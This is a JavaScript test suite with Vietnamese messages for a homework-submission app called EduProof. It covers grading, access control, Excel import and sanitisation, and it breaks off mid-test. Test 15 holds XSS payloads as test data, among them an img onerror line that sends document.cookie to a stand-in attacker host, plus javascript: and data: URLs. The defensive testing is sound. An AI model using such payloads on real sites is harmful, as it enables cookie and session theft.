// Self-check test suite for EduProof core business logic
const assert = require("assert");
const path = require("path");

console.log("🧪 Đang chạy kiểm thử hệ thống EduProof...");

// 1. Test: Image compression calculation logic
function computeTargetDimensions(width, height, maxDimension) {
  if (width <= maxDimension && height <= maxDimension) {
    return { width, height };
  }
  if (width > height) {
    return {
      width: maxDimension,
      height: Math.round((height * maxDimension) / width)
    };
  } else {
    return {
      width: Math.round((width * maxDimension) / height),
      height: maxDimension
    };
  }
}

const dim1 = computeTargetDimensions(4000, 3000, 1600);
assert.strictEqual(dim1.width, 1600, "Chiều rộng tối đa phải là 1600");
assert.strictEqual(dim1.height, 1200, "Tỷ lệ chiều cao phải giữ nguyên 4:3 (1200)");
console.log("✅ 1. Kiểm thử thuật toán tính toán kích thước nén ảnh: ĐẠT");

// 2. Test: Submission validation
function validateSubmission(photos, minRequired) {
  if (!Array.isArray(photos)) return false;
  return photos.length >= (minRequired || 1);
}

assert.strictEqual(validateSubmission([], 1), false, "Không có ảnh phải bị từ chối");
assert.strictEqual(validateSubmission(["p1.jpg", "p2.jpg"], 2), true, "Đủ số trang yêu cầu phải hợp lệ");
console.log("✅ 2. Kiểm thử ràng buộc số lượng ảnh minh chứng tối thiểu: ĐẠT");

// 3. Test: Score bounds and status transitions
function gradeSubmission(sub, score, feedback, requestResubmit) {
  if (requestResubmit) {
    sub.status = "resubmit_requested";
    sub.resubmitRequested = true;
    sub.grade = null;
    sub.feedback = feedback || "Yêu cầu chụp lại.";
    return sub;
  }

  if (score < 0 || score > 10 || isNaN(score)) {
    throw new Error("Điểm số ngoài khoảng 0 - 10");
  }

  sub.status = "graded";
  sub.resubmitRequested = false;
  sub.grade = score;
  sub.feedback = feedback;
  return sub;
}

const sampleSub = { id: "sub_1", status: "submitted", grade: null };
gradeSubmission(sampleSub, 8.5, "Tốt", false);
assert.strictEqual(sampleSub.status, "graded");
assert.strictEqual(sampleSub.grade, 8.5);

gradeSubmission(sampleSub, 0, "Ảnh mờ", true);
assert.strictEqual(sampleSub.status, "resubmit_requested");
assert.strictEqual(sampleSub.grade, null);
console.log("✅ 3. Kiểm thử chuyển đổi trạng thái chấm điểm và yêu cầu nộp lại: ĐẠT");

// 4. Test: Account Management - Only teacher can create student accounts
function createStudent(actingUser, usersList, studentData) {
  if (!actingUser || actingUser.role !== "teacher") {
    throw new Error("Chỉ giáo viên mới có quyền tạo tài khoản");
  }
  if (!studentData.username || !studentData.name) {
    throw new Error("Thiếu thông tin học sinh");
  }
  if (usersList.some((u) => u.username === studentData.username)) {
    throw new Error("Tên đăng nhập đã tồn tại");
  }
  const newUser = {
    id: "hs_" + Date.now(),
    role: "student",
    ...studentData
  };
  usersList.push(newUser);
  return newUser;
}

const testUsers = [
  { id: "gv_1", username: "gvcn-ngo-ha", password: "000000", role: "teacher" },
  { id: "hs_1", username: "hs_an", password: "123456", role: "student" }
];

// Student tries to create account -> blocked
assert.throws(() => {
  createStudent(testUsers[1], testUsers, { username: "hs_mai", name: "Trần Mai" });
}, /Chỉ giáo viên mới có quyền/);

// Teacher creates account -> success
const created = createStudent(testUsers[0], testUsers, { username: "hs_mai", name: "Trần Mai", class: "12A1" });
assert.strictEqual(created.role, "student");
assert.strictEqual(testUsers.length, 3);
console.log("✅ 4. Kiểm thử phân quyền tạo tài khoản học sinh bởi giáo viên: ĐẠT");

// 5. Test: Assignment Deletion (cleans up assignment & related submissions)
function deleteAssignmentCascade(assignmentsList, submissionsList, assignmentId) {
  const newAssignments = assignmentsList.filter((a) => a.id !== assignmentId);
  const newSubmissions = submissionsList.filter((s) => s.assignmentId !== assignmentId);
  return { newAssignments, newSubmissions };
}

const mockAssignments = [{ id: "asg_1" }, { id: "asg_2" }];
const mockSubmissions = [
  { id: "sub_1", assignmentId: "asg_1" },
  { id: "sub_2", assignmentId: "asg_2" },
  { id: "sub_3", assignmentId: "asg_1" }
];

const deleteRes = deleteAssignmentCascade(mockAssignments, mockSubmissions, "asg_1");
assert.strictEqual(deleteRes.newAssignments.length, 1);
assert.strictEqual(deleteRes.newSubmissions.length, 1);
assert.strictEqual(deleteRes.newSubmissions[0].assignmentId, "asg_2");
console.log("✅ 5. Kiểm thử xóa bài tập và dọn dẹp các bài nộp liên quan: ĐẠT");

// 6. Test: Campaign (Đợt bài tập) Roster Calculation
function calculateCampaignStats(studentsList, submissionsList, assignmentId) {
  const asgSubs = submissionsList.filter((s) => s.assignmentId === assignmentId);
  const submittedCount = asgSubs.length;
  const gradedCount = asgSubs.filter((s) => s.status === "graded").length;
  const notSubmittedCount = Math.max(0, studentsList.length - submittedCount);
  return { submittedCount, gradedCount, notSubmittedCount };
}

const mockStudents = [{ id: "s1" }, { id: "s2" }, { id: "s3" }];
const mockSubsForCampaign = [
  { studentId: "s1", assignmentId: "asg_1", status: "graded" }
];
const campaignStats = calculateCampaignStats(mockStudents, mockSubsForCampaign, "asg_1");
assert.strictEqual(campaignStats.submittedCount, 1);
assert.strictEqual(campaignStats.gradedCount, 1);
assert.strictEqual(campaignStats.notSubmittedCount, 2);
console.log("✅ 6. Kiểm thử thống kê tiến độ nộp bài theo đợt bài tập: ĐẠT");

// 7. Test: Gatekeeper Login & Session Independence
function checkAccessControl(sessionUser, requestedView) {
  if (!sessionUser) {
    return "LOGIN_REQUIRED";
  }
  if (requestedView === "teacher_view" && sessionUser.role !== "teacher") {
    return "ACCESS_DENIED";
  }
  if (requestedView === "student_view" && sessionUser.role !== "student") {
    return "ACCESS_DENIED";
  }
  return "ACCESS_GRANTED";
}

// Unauthenticated user must see login
assert.strictEqual(checkAccessControl(null, "student_view"), "LOGIN_REQUIRED");
assert.strictEqual(checkAccessControl(null, "teacher_view"), "LOGIN_REQUIRED");

// Student user cannot access teacher view
const studentSession = { id: "hs_1", role: "student" };
assert.strictEqual(checkAccessControl(studentSession, "student_view"), "ACCESS_GRANTED");
assert.strictEqual(checkAccessControl(studentSession, "teacher_view"), "ACCESS_DENIED");

// Teacher user cannot access student view directly (independent accounts)
const teacherSession = { id: "gv_1", role: "teacher" };
assert.strictEqual(checkAccessControl(teacherSession, "teacher_view"), "ACCESS_GRANTED");
assert.strictEqual(checkAccessControl(teacherSession, "student_view"), "ACCESS_DENIED");

console.log("✅ 7. Kiểm thử bảo vệ cổng đăng nhập & tính độc lập giữa học sinh - giáo viên: ĐẠT");

// 8. Test: Multi-Teacher Data Isolation
const multiTeachers = [
  { id: "gv_ha", username: "gvcn-ngo-ha", role: "teacher" },
  { id: "gv_nam", username: "gv-nam", role: "teacher" }
];

const multiStudents = [
  { id: "hs_an", name: "An", role: "student", teacherId: "gv_ha" },
  { id: "hs_mai", name: "Mai", role: "student", teacherId: "gv_ha" },
  { id: "hs_tuan", name: "Tuấn", role: "student", teacherId: "gv_nam" }
];

const multiAssignments = [
  { id: "asg_math", teacherId: "gv_ha", title: "Toán 12" },
  { id: "asg_eng", teacherId: "gv_nam", title: "Anh văn 12" }
];

// Check teacher Ha's scope
const haStudents = multiStudents.filter((s) => s.teacherId === "gv_ha");
const haAssignments = multiAssignments.filter((a) => a.teacherId === "gv_ha");
assert.strictEqual(haStudents.length, 2, "Cô Hà quản lý đúng 2 học sinh của mình");
assert.strictEqual(haAssignments.length, 1, "Cô Hà chỉ thấy 1 bài tập do mình tạo");
assert.strictEqual(haStudents.some((s) => s.id === "hs_tuan"), false, "Cô Hà không được thấy học sinh Tuấn của Thầy Nam");

// Check teacher Nam's scope
const namStudents = multiStudents.filter((s) => s.teacherId === "gv_nam");
assert.strictEqual(namStudents.length, 1, "Thầy Nam quản lý đúng 1 học sinh");
assert.strictEqual(namStudents[0].id, "hs_tuan");
console.log("✅ 8. Kiểm thử cô lập dữ liệu giữa các giáo viên khác nhau: ĐẠT");

// 9. Test: Admin Oversight & Teacher Hierarchy
function checkAdminCapabilities(adminUser, allTeachers, allStudents) {
  if (!adminUser || adminUser.role !== "admin") {
    throw new Error("Chỉ tài khoản admin mới có quyền quản trị trường");
  }
  return {
    totalTeachers: allTeachers.length,
    totalStudents: allStudents.length,
    studentsPerTeacher: allTeachers.map((t) => ({
      teacher: t.username,
      students: allStudents.filter((s) => s.teacherId === t.id)
    }))
  };
}

const adminUser = { id: "admin_root", username: "admin", role: "admin" };
const adminReport = checkAdminCapabilities(adminUser, multiTeachers, multiStudents);
assert.strictEqual(adminReport.totalTeachers, 2);
assert.strictEqual(adminReport.totalStudents, 3);
assert.strictEqual(adminReport.studentsPerTeacher[0].students.length, 2);
assert.strictEqual(adminReport.studentsPerTeacher[1].students.length, 1);

// Teacher trying to access admin function -> blocked
assert.throws(() => {
  checkAdminCapabilities(multiTeachers[0], multiTeachers, multiStudents);
}, /Chỉ tài khoản admin mới có quyền/);

console.log("✅ 9. Kiểm thử quyền giám sát toàn trường & quản lý giáo viên của Admin: ĐẠT");

// 10. Test: Supabase Cloud Data Mapping & Serialization
function mapSupabaseToApp(asgRow, subRow) {
  const asg = {
    id: asgRow.id,
    teacherId: asgRow.teacher_id,
    title: asgRow.title,
    subject: asgRow.subject,
    deadline: asgRow.deadline,
    description: asgRow.description,
    minPhotos: asgRow.min_photos,
    allowLink: asgRow.allow_link,
    allowNote: asgRow.allow_note,
    createdAt: asgRow.created_at
  };
  const sub = {
    id: subRow.id,
    assignmentId: subRow.assignment_id,
    studentId: subRow.student_id,
    studentName: subRow.student_name,
    submittedAt: subRow.submitted_at,
    status: subRow.status,
    photos: subRow.photos || [],
    linkProof: subRow.link_proof || "",
    studentNote: subRow.student_note || "",
    annotations: subRow.annotations || {},
    grade: subRow.grade,
    feedback: subRow.feedback || "",
    resubmitRequested: subRow.resubmit_requested || false
  };
  return { asg, sub };
}

const mockDbAsg = {
  id: "asg_101",
  teacher_id: "gvcn_ngo_ha",
  title: "Đại số 12 - Ôn tập",
  subject: "Toán",
  deadline: "2026-11-06T20:00:00Z",
  description: "Làm bài tập trang 45",
  min_photos: 2,
  allow_link: true,
  allow_note: true,
  created_at: "2026-11-05T08:00:00Z"
};
const mockDbSub = {
  id: "sub_202",
  assignment_id: "asg_101",
  student_id: "hs_an",
  student_name: "Nguyễn Văn An",
  submitted_at: "2026-11-05T10:00:00Z",
  status: "graded",
  photos: [{ id: "p1", data: "data:image/jpeg;base64,abc" }],
  link_proof: "https://drive.google.com/test",
  student_note: "Em đã hoàn thành bài 1 và 2",
  annotations: { 0: [{ type: "check", x: 100, y: 150 }] },
  grade: 9.5,
  feedback: "Làm bài rất tốt",
  resubmit_requested: false
};

const mapped = mapSupabaseToApp(mockDbAsg, mockDbSub);
assert.strictEqual(mapped.asg.teacherId, mockDbAsg.teacher_id);
assert.strictEqual(mapped.asg.minPhotos, 2);
assert.strictEqual(mapped.sub.assignmentId, mockDbSub.assignment_id);
assert.strictEqual(mapped.sub.grade, 9.5);
assert.strictEqual(mapped.sub.photos.length, 1);
assert.strictEqual(mapped.sub.annotations["0"][0].type, "check");
console.log("✅ 10. Kiểm thử ánh xạ chuẩn hóa cấu trúc dữ liệu Supabase Cloud: ĐẠT");

// 11. Test: Full Cloud Lifecycle (Teacher creates -> Student submits -> Teacher grades)
class MockSupabaseTable {
  constructor() { this.rows = []; }
  upsert(items) {
    for (const item of items) {
      const idx = this.rows.findIndex((r) => r.id === item.id);
      if (idx >= 0) this.rows[idx] = item;
      else this.rows.push(item);
    }
    return Promise.resolve({ data: items, error: null });
  }
  select() { return Promise.resolve({ data: [...this.rows], error: null }); }
}

const cloudAsgs = new MockSupabaseTable();
const cloudSubs = new MockSupabaseTable();

// 1. Teacher publishes assignment
cloudAsgs.upsert([mockDbAsg]);
// 2. Student queries assignments and submits work
cloudSubs.upsert([mockDbSub]);
// 3. Teacher updates grade on cloud
mockDbSub.grade = 10;
mockDbSub.feedback = "Đã chỉnh sửa hoàn hảo";
cloudSubs.upsert([mockDbSub]);

assert.strictEqual(cloudAsgs.rows.length, 1);
assert.strictEqual(cloudSubs.rows[0].grade, 10);
assert.strictEqual(cloudSubs.rows[0].feedback, "Đã chỉnh sửa hoàn hảo");
console.log("✅ 11. Kiểm thử vòng đời đồng bộ đám mây liên thông Giáo viên - Học sinh: ĐẠT");

// 12. Test: Excel Batch Student Row Parsing & Normalization
function normalizeHeaderKey(key) {
  return (key || "")
    .toString()
    .toLowerCase()
    .replace(/đ/g, "d")
    .replace(/Đ/g, "d")
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/[^a-z0-9]/g, "");
}

function parseMockExcelRows(rows, teacherId, defaultClass) {
  const result = [];
  rows.forEach((row, idx) => {
    let name = "";
    let username = "";
    let studentClass = "";
    let password = "";

    Object.keys(row).forEach((col) => {
      const norm = normalizeHeaderKey(col);
      const val = row[col] ? row[col].toString().trim() : "";
      if (norm.includes("tendangnhap") || norm.includes("dangnhap") || norm.includes("taikhoan") || norm.includes("username") || norm === "user" || norm.includes("mahs")) {
        if (!username) username = val;
      } else if (norm.includes("ten") || norm.includes("hoten") || norm.includes("hovaten") || norm.includes("fullname") || norm === "name" || norm.includes("hocsinh")) {
        if (!name) name = val;
      } else if (norm.includes("lop") || norm.includes("class")) {
        if (!studentClass) studentClass = val;
      } else if (norm.includes("matkhau") || norm.includes("password") || norm === "mk") {
        if (!password) password = val;
      }
    });

    if (!name) return; // skip row without name

    result.push({
      id: "hs_" + Date.now() + "_" + idx,
      name,
      username: username || ("hs_" + idx),
      class: studentClass || defaultClass,
      password: password || "123456",
      role: "student",
      teacherId
    });
  });
  return result;
}

const rawExcelSample = [
  { "Họ và tên": "Đặng Thị Thảo", "Tên đăng nhập": "hs_thao", "Lớp": "12A1", "Mật khẩu": "pass123" },
  { "Tên học sinh": "Bùi Tuấn Anh", "Tài khoản": "hs_tuananh", "Lớp học": "12A1", "MK": "000000" },
  { "name": "Vũ Lan Hương", "username": "", "class": "", "password": "" }, // missing optional fields
  { "Ghi chú": "Không phải học sinh" } // invalid row to skip
];

const parsedStudents = parseMockExcelRows(rawExcelSample, "gvcn_ngo_ha", "12A1");
assert.strictEqual(parsedStudents.length, 3, "Chỉ 3 dòng có tên hợp lệ được parse");
assert.strictEqual(parsedStudents[0].name, "Đặng Thị Thảo");
assert.strictEqual(parsedStudents[0].password, "pass123");
assert.strictEqual(parsedStudents[1].username, "hs_tuananh");
assert.strictEqual(parsedStudents[2].name, "Vũ Lan Hương");
assert.strictEqual(parsedStudents[2].class, "12A1", "Tự động gán lớp mặc định nếu trống");
assert.strictEqual(parsedStudents[2].password, "123456", "Tự động gán mật khẩu 123456 nếu trống");
assert.strictEqual(parsedStudents[2].teacherId, "gvcn_ngo_ha", "Gán đúng quyền quản lý cho giáo viên");
console.log("✅ 12. Kiểm thử nhận diện và chuẩn hóa cột dữ liệu Excel đa dạng: ĐẠT");

// 13. Test: Batch Student Creation to Supabase Cloud Payload
const cloudBatchPayload = parsedStudents.map((s) => ({
  id: s.id,
  username: s.username,
  password: s.password,
  name: s.name,
  role: s.role,
  class: s.class,
  teacher_id: s.teacherId
}));
assert.strictEqual(cloudBatchPayload.length, 3);
assert.strictEqual(cloudBatchPayload[0].teacher_id, "gvcn_ngo_ha");
console.log("✅ 13. Kiểm thử đóng gói dữ liệu hàng loạt đẩy lên Supabase Cloud: ĐẠT");

// 14. Test: Session & State Retention across F5 (Page Refresh)
class MockStorage {
  constructor() { this.store = {}; }
  getItem(k) { return this.store[k] || null; }
  setItem(k, v) { this.store[k] = String(v); }
  removeItem(k) { delete this.store[k]; }
}

const mockLocalStorage = new MockStorage();
const mockSessionStorage = new MockStorage();

function simulateLogin(user, teacherTab) {
  mockLocalStorage.setItem("eduproof_auth_user", JSON.stringify(user));
  mockSessionStorage.setItem("eduproof_auth_user", JSON.stringify(user));
  mockLocalStorage.setItem("eduproof_teacher_tab", teacherTab || "submissions");
}

function simulateRefreshF5(usersList) {
  const savedAuth = mockLocalStorage.getItem("eduproof_auth_user") || mockSessionStorage.getItem("eduproof_auth_user");
  let restoredUser = null;
  if (savedAuth) {
    const parsed = JSON.parse(savedAuth);
    restoredUser = usersList.find((u) => u.username === parsed.username) || parsed;
  }
  const restoredTab = mockLocalStorage.getItem("eduproof_teacher_tab") || "submissions";
  return { currentUser: restoredUser, teacherActiveTab: restoredTab };
}

function simulateLogout() {
  mockLocalStorage.removeItem("eduproof_auth_user");
  mockSessionStorage.removeItem("eduproof_auth_user");
  mockLocalStorage.removeItem("eduproof_teacher_tab");
}

// 1. User logs in as Teacher on students tab
const teacherUser = { id: "gvcn_ngo_ha", username: "gvcn-ngo-ha", role: "teacher" };
simulateLogin(teacherUser, "students");

// 2. F5 is pressed -> session & tab are restored perfectly
const stateAfterF5 = simulateRefreshF5([teacherUser]);
assert.notStrictEqual(stateAfterF5.currentUser, null, "currentUser không được là null sau F5");
assert.strictEqual(stateAfterF5.currentUser.username, "gvcn-ngo-ha", "Đúng tài khoản giáo viên");
assert.strictEqual(stateAfterF5.teacherActiveTab, "students", "Giữ nguyên tab danh sách học sinh đang mở");

// 3. User logs out explicitly -> session cleared
simulateLogout();
const stateAfterLogoutF5 = simulateRefreshF5([teacherUser]);
assert.strictEqual(stateAfterLogoutF5.currentUser, null, "Sau đăng xuất thì về màn hình đăng nhập");

console.log("✅ 14. Kiểm thử duy trì phiên làm việc & tab đang xem khi nhấn F5: ĐẠT");

// 15. Test: XSS Sanitization & Malicious URL Blocking
function sanitizeText(str) {
  if (str === null || str === undefined) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function sanitizeUrl(url) {
  if (!url) return "#";
  const trimmed = String(url).trim();
  if (/^https?:\/\//i.test(trimmed)) {
    return sanitizeText(trimmed);
  }
  return "#";
}

const xssPayload1 = "<script>alert('Hacked')</script>";
const xssPayload2 = "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>";
const safeText1 = sanitizeText(xssPayload1);
const safeText2 = sanitizeText(xssPayload2);
assert.strictEqual(safeText1.includes("<script>"), false, "Thẻ script phải bị mã hóa HTML");
assert.strictEqual(safeText1.includes("&lt;script&gt;"), true, "Thẻ script chuyển thành entity an toàn");
assert.strictEqual(safeText2.includes("<img"), false, "Thẻ img tấn công onerror phải bị vô hiệu hóa");

const maliciousLink1 = "javascript:alert(document.domain)";
const maliciousLink2 = "data:text/html,<script>alert(1)</script>";
const legitimateLink = "https://drive.google.com/file/d/123/view";
assert.strictEqual(sanitizeUrl(maliciousLink1), "#", "Link javascript: độc hại phải bị chặn về #");
assert.strictEqual(sanitizeUrl(maliciousLink2), "#", "Link data: độc hại phải bị chặn về #");
assert.strictEqual(sanitizeUrl(legitimateLink), legitimateLink, "Link https:// hợp lệ được phép giữ nguyên");
console.log("✅ 15. Kiểm thử phòng chống tấn công XSS và chặn link độc hại: ĐẠT");

// 16. Test: Photo Upload Constraints (MIME Type & Size Limits)
function validateUploadFile(file) {
  const maxBytes = 15 * 1024 * 1024; // 15MB
  if (!file.type.startsWith("image/")) {
    return { valid: false, reason: "NOT_IMAGE" };
  }
  if (file.size > maxBytes) {
    return { valid: false, reason: "FILE_TOO_LARGE" };
  }
  return { valid: true };
}

const testImgOk = { name: "bai_lam.jpg", type: "image/jpeg", size: 1.5 * 1024 * 1024 };
const testImgLarge = { name: "bai_lam_khung.jpg", type: "image/jpeg", size: 20 * 1024 * 1024 };
const testExe = { name: "hack.exe", type: "application/x-msdownload", size: 1024 };

assert.strictEqual(validateUploadFile(testImgOk).valid, true);
assert.strictEqual(validateUploadFile(testImgLarge).valid, false);
assert.strictEqual(validateUploadFile(testImgLarge).reason, "FILE_TOO_LARGE");
assert.strictEqual(validateUploadFile(testExe).valid, false);
assert.strictEqual(validateUploadFile(testExe).reason, "NOT_IMAGE");
console.log("✅ 16. Kiểm thử ràng buộc bảo mật tệp đính kèm (MIME và dung lượng tối đa): ĐẠT");

// 17. Test: Cloud Assignment Sync & Deletion Lifecycle
function syncAssignmentsBetweenTeacherAndStudent(teacherUser, studentUser, asgList) {
  // Teacher creates an assignment
  const newAsg = {
    id: "asg_cloud_99",
    teacherId: teacherUser.id,
    title: "Văn 12 - Nghị luận xã hội",
    subject: "Ngữ văn",
    deadline: new Date().toISOString()
  };
  asgList.push(newAsg);

  // Student queries their assignments
  const studentVisible = asgList.filter(
    (a) => a.teacherId === studentUser.teacherId || !a.teacherId || a.teacherId === "gvcn_ngo_ha"
  );
  assert.strictEqual(studentVisible.some((a) => a.id === newAsg.id), true, "Học sinh phải thấy bài tập mới của GV");

  // Teacher deletes the assignment
  const updatedAsgList = asgList.filter((a) => a.id !== newAsg.id);
  const studentVisibleAfterDelete = updatedAsgList.filter(
    (a) => a.teacherId === studentUser.teacherId || !a.teacherId || a.teacherId === "gvcn_ngo_ha"
  );
  assert.strictEqual(studentVisibleAfterDelete.some((a) => a.id === newAsg.id), false, "Bài tập đã xóa không còn hiển thị với học sinh");

  return true;
}

const teacherT = { id: "gvcn_ngo_ha", role: "teacher" };
const studentS = { id: "hs_an", role: "student", teacherId: "gvcn_ngo_ha" };
syncAssignmentsBetweenTeacherAndStudent(teacherT, studentS, []);
console.log("✅ 17. Kiểm thử đồng bộ hai chiều tạo và xóa bài tập giữa Giáo viên và Học sinh: ĐẠT");

// 18. Test: Storage upload with fallback logic
async function mockUploadPhotoToStorage(mockSb, dataUrl, filePath) {
  if (!mockSb || !dataUrl || !dataUrl.startsWith("data:")) return null;
  try {
    const res = await mockSb.storage.from("proofs").upload(filePath, dataUrl);
    if (res.error) return null;
    return mockSb.storage.from("proofs").getPublicUrl(filePath).data.publicUrl;
  } catch (e) {
    return null;
  }
}

// Case 1: Storage online & bucket exists -> returns public storage URL
const mockSbOk = {
  storage: {
    from: () => ({
      upload: async () => ({ error: null }),
      getPublicUrl: (p) => ({ data: { publicUrl: `https://test.supabase.co/storage/v1/object/public/proofs/${p}` } })
    })
  }
};
// Case 2: Storage bucket not found -> fallback gracefully (returns null)
const mockSbFail = {
  storage: {
    from: () => ({
      upload: async () => ({ error: { message: "Bucket not found" } }),
      getPublicUrl: () => ({ data: null })
    })
  }
};

(async () => {
  const urlOk = await mockUploadPhotoToStorage(mockSbOk, "data:image/jpeg;base64,abc", "submissions/asg1/hs1/p1.jpg");
  assert.strictEqual(urlOk, "https://test.supabase.co/storage/v1/object/public/proofs/submissions/asg1/hs1/p1.jpg");

  const urlFail = await mockUploadPhotoToStorage(mockSbFail, "data:image/jpeg;base64,abc", "submissions/asg1/hs1/p1.jpg");
  assert.strictEqual(urlFail, null, "Khi bucket chưa tạo phải fallback về null (giữ nguyên base64)");
})();
console.log("✅ 18. Kiểm thử tải ảnh lên Supabase Storage với cơ chế fallback Base64 an toàn: ĐẠT");

// 19. Test: RPC Identity Verification & Anti-Impersonation
function mockRpcSubmitHomework(usersTable, submissionsTable, p) {
  // 1. Xác thực học sinh & mật khẩu
  const student = usersTable.find((u) => u.id === p.studentId && u.password === p.password && u.role === "student");
  if (!student) {
    throw new Error("Xác thực không thành công: Mã học sinh hoặc mật khẩu không chính xác.");
  }
  // 2. Không cho phép nộp đè nếu bài đã chấm
  const existing = submissionsTable.find((s) => s.assignmentId === p.assignmentId && s.studentId === p.studentId);
  if (existing && existing.status === "graded") {
    throw new Error("Bài nộp này đã được giáo viên chấm điểm. Không thể sửa.");
  }
  return { success: true };
}

const mockUsers = [
  { id: "hs_an", password: "123", role: "student" },
  { id: "hs_binh", password: "456", role: "student" },
  { id: "gv_ha", password: "000", role: "teacher" }
];
const mockSubs = [
  { id: "sub_1", assignmentId: "asg_1", studentId: "hs_an", status: "graded", grade: 9 }
];

// Chính chủ nộp bài mới -> Thành công
assert.strictEqual(
  mockRpcSubmitHomework(mockUsers, mockSubs, { studentId: "hs_binh", password: "456", assignmentId: "asg_1" }).success,
  true
);

// Kẻ mạo danh nộp bài thay hs_binh nhưng không biết mật khẩu -> Bị chặn
assert.throws(() => {
  mockRpcSubmitHomework(mockUsers, mockSubs, { studentId: "hs_binh", password: "wrong", assignmentId: "asg_1" });
}, /Mã học sinh hoặc mật khẩu không chính xác/);

// Học sinh cố tình nộp đè lên bài đã được chấm điểm 9 -> Bị chặn
assert.throws(() => {
  mockRpcSubmitHomework(mockUsers, mockSubs, { studentId: "hs_an", password: "123", assignmentId: "asg_1" });
}, /đã được giáo viên chấm điểm/);

console.log("✅ 19. Kiểm thử xác thực RPC submit_homework chống nộp thay & chống sửa điểm: ĐẠT");

// 20. Test: RPC login_user (Secure Authentication without Password Leaks)
function mockRpcLoginUser(usersTable, username, password) {
  const user = usersTable.find((u) => u.username === username && u.password === password);
  if (!user) return null;
  return {
    id: user.id,
    username: user.username,
    name: user.name,
    role: user.role,
    class: user.class,
    subject: user.subject,
    teacherId: user.teacherId
  };
}

const userDir = [
  { id: "admin_root", username: "admin", password: "123", name: "Admin", role: "admin" },
  { id: "gv_ha", username: "gv-ha", password: "000", name: "Cô Hà", role: "teacher" },
  { id: "hs_an", username: "hs-an", password: "111", name: "An", role: "student", teacherId: "gv_ha" }
];

// Login đúng -> Trả về profile không chứa password của người khác
const loginOk = mockRpcLoginUser(userDir, "hs-an", "111");
assert.strictEqual(loginOk.username, "hs-an");
assert.strictEqual(loginOk.role, "student");
assert.strictEqual(loginOk.password, undefined, "Mật khẩu không được trả về trong payload công khai");

// Login sai -> Trả về null
assert.strictEqual(mockRpcLoginUser(userDir, "hs-an", "sai_pass"), null);
console.log("✅ 20. Kiểm thử RPC login_user xác thực bảo mật & chống lộ mật khẩu: ĐẠT");

// 21. Test: RPC get_my_students (Teacher Scoped Student Access)
function mockRpcGetMyStudents(usersTable, teacherId, password) {
  const teacher = usersTable.find((u) => u.id === teacherId && u.password === password && (u.role === "teacher" || u.role === "admin"));
  if (!teacher) {
    throw new Error("Xác thực giáo viên không thành công.");
  }
  if (teacher.role === "admin") {
    return usersTable.filter((u) => u.role === "student");
  }
  return usersTable.filter((u) => u.role === "student" && u.teacherId === teacherId);
}

// Giáo viên đúng mật khẩu -> Chỉ lấy được học sinh lớp mình
const teacherStudents = mockRpcGetMyStudents(userDir, "gv_ha", "000");
assert.strictEqual(teacherStudents.length, 1);
assert.strictEqual(teacherStudents[0].id, "hs_an");

// Học sinh mạo danh giáo viên -> Bị chặn
assert.throws(() => {
  mockRpcGetMyStudents(userDir, "hs_an", "111");
}, /Xác thực giáo viên không thành công/);

console.log("✅ 21. Kiểm thử RPC get_my_students phân quyền tài khoản theo lớp của giáo viên: ĐẠT");

// 22. Test: Submission Rate Limiting / Anti-Spam Check
function checkSubmissionRateLimit(lastSubmittedAt, cooldownSeconds = 3) {
  if (!lastSubmittedAt) return { allowed: true };
  const diffMs = Date.now() - new Date(lastSubmittedAt).getTime();
  if (diffMs < cooldownSeconds * 1000) {
    return { allowed: false, retryAfterMs: cooldownSeconds * 1000 - diffMs };
  }
  return { allowed: true };
}

const justNow = new Date().toISOString();
assert.strictEqual(checkSubmissionRateLimit(justNow, 3).allowed, false, "Gửi lại trong 3 giây phải bị chặn chống spam");
const twoMinutesAgo = new Date(Date.now() - 120000).toISOString();
assert.strictEqual(checkSubmissionRateLimit(twoMinutesAgo, 3).allowed, true, "Gửi lại sau thời gian cooldown phải được phép");
console.log("✅ 22. Kiểm thử cơ chế Rate Limiting chống spam gửi bài liên tục: ĐẠT");

// 23. Test: Overdue Deadline Status Calculation
function computeAssignmentStatusBadge(deadlineIso, submission) {
  const isPast = new Date() > new Date(deadlineIso);
  if (!submission) {
    return isPast ? "OVERDUE" : "PENDING";
  }
  if (submission.status === "graded") return "GRADED";
  if (submission.status === "resubmit_requested") return "RESUBMIT";
  return "SUBMITTED";
}

const pastDeadline = new Date(Date.now() - 3600000).toISOString();
const futureDeadline = new Date(Date.now() + 3600000).toISOString();
assert.strictEqual(computeAssignmentStatusBadge(pastDeadline, null), "OVERDUE", "Chưa nộp và quá deadline -> OVERDUE");
assert.strictEqual(computeAssignmentStatusBadge(futureDeadline, null), "PENDING", "Chưa nộp và còn hạn -> PENDING");
assert.strictEqual(computeAssignmentStatusBadge(pastDeadline, { status: "submitted" }), "SUBMITTED");
console.log("✅ 23. Kiểm thử nhận diện quá hạn nộp bài tập (Overdue Deadline): ĐẠT");

// 24. Test: Student Instant Search Filter (by Name, Username, Class)
function filterStudentsByQuery(students, query) {
  const q = (query || "").trim().toLowerCase();
  if (!q) return students;
  return students.filter(
    (s) =>
      (s.name && s.name.toLowerCase().includes(q)) ||
      (s.username && s.username.toLowerCase().includes(q)) ||
      (s.class && s.class.toLowerCase().includes(q))
  );
}

const sampleClass = [
  { id: "hs_1", name: "Nguyễn Văn An", username: "an_12a1", class: "12A1" },
  { id: "hs_2", name: "Trần Thị Bình", username: "binh_12a1", class: "12A1" },
  { id: "hs_3", name: "Lê Hoàng Cường", username: "cuong_12a2", class: "12A2" }
];

assert.strictEqual(filterStudentsByQuery(sampleClass, "").length, 3, "Rỗng trả về đủ 3");
assert.strictEqual(filterStudentsByQuery(sampleClass, "bình").length, 1, "Tìm theo tên tiếng Việt");
assert.strictEqual(filterStudentsByQuery(sampleClass, "12a2").length, 1, "Tìm theo lớp");
assert.strictEqual(filterStudentsByQuery(sampleClass, "an_12").length, 1, "Tìm theo username");
assert.strictEqual(filterStudentsByQuery(sampleClass, "không_tồn_tại").length, 0);
console.log("✅ 24. Kiểm thử tìm kiếm tức thì danh sách học sinh (Instant Search): ĐẠT");

// 25. Test: Cross-Platform Camera Stream Resolver & Native Fallback
function resolveCameraAction(mockNavigator) {
  const hasGetUserMedia = Boolean(
    (mockNavigator.mediaDevices && mockNavigator.mediaDevices.getUserMedia) ||
    mockNavigator.getUserMedia ||
    mockNavigator.webkitGetUserMedia
  );
  if (hasGetUserMedia) {
